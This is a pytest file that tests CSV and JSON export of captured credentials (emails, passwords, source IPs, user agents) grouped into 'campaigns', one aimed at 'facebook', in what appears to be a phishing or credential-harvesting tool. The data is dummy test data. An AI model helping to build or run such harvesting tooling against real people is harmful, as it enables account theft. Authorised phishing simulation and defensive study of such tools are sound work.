from __future__ import annotations

import csv
import json

from crystal_eye.db.models import Credential
from crystal_eye.export.exporter import Exporter


def test_export_csv(campaign_repo, cred_repo, tmp_path):
    campaign = campaign_repo.create("test-export", "facebook")
    cred_repo.save(Credential(
        campaign_id=campaign.id,
        fields={"email": "user@test.com", "pass": "secret"},
        source_ip="127.0.0.1",
        user_agent="TestAgent",
    ))

    exporter = Exporter(cred_repo, campaign_repo)
    path = exporter.to_csv("test-export", tmp_path / "export.csv")

    assert path.exists()
    with open(path) as f:
        reader = csv.reader(f)
        rows = list(reader)
    assert len(rows) == 2  # header + 1 row
    assert "user@test.com" in rows[1]


def test_export_json(campaign_repo, cred_repo, tmp_path):
    campaign = campaign_repo.create("test-export", "facebook")
    cred_repo.save(Credential(
        campaign_id=campaign.id,
        fields={"email": "user@test.com", "pass": "secret"},
        source_ip="127.0.0.1",
    ))

    exporter = Exporter(cred_repo, campaign_repo)
    path = exporter.to_json("test-export", tmp_path / "export.json")

    assert path.exists()
    data = json.loads(path.read_text())
    assert len(data) == 1
    assert data[0]["fields"]["email"] == "user@test.com"


def test_export_empty(campaign_repo, cred_repo, tmp_path):
    exporter = Exporter(cred_repo, campaign_repo)
    path = exporter.to_csv(output_path=tmp_path / "empty.csv")
    assert path.exists()
    with open(path) as f:
        reader = csv.reader(f)
        rows = list(reader)
    assert len(rows) == 1  # just header
